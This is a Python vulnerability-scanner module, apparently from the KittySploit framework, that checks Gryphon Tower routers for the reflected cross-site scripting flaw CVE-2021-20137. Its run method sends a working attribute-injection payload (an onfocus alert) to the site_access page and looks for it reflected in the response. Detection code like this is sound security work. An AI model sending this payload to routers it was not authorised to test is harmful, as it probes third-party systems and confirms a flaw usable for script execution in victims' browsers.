#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Gryphon Tower router web interface contains a reflected cross-site scripting vulnerability in the url paramete."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Gryphon Tower - Cross-Site Scripting Detection',
        'description': "Gryphon Tower router web interface contains a reflected cross-site scripting vulnerability in the url parameter of the /cgi-bin/luci/site_access/ page. An attacker can exploit this issue by tricking a user into following a specially crafted link, granting the attacker JavaScript execution in the victim's browser.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'xss', 'tenable', 'gryphon', 'gryphonconnect', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-20137',
            'https://www.tenable.com/security/research/tra-2021-51',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-20137',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2021-20137',
    }

    def run(self):
        r = self.http_request(method="GET", path='/cgi-bin/luci/site_access/?url=%22%20onfocus=alert(document.domain)%20autofocus=1', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('onfocus=alert(document.domain) autofocus=1>', 'Send Access Request URL',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Gryphon Tower - Cross-Site Scripting detected",
                path='/cgi-bin/luci/site_access/?url=%22%20onfocus=alert(document.domain)%20autofocus=1',
            )
            return True
        return False

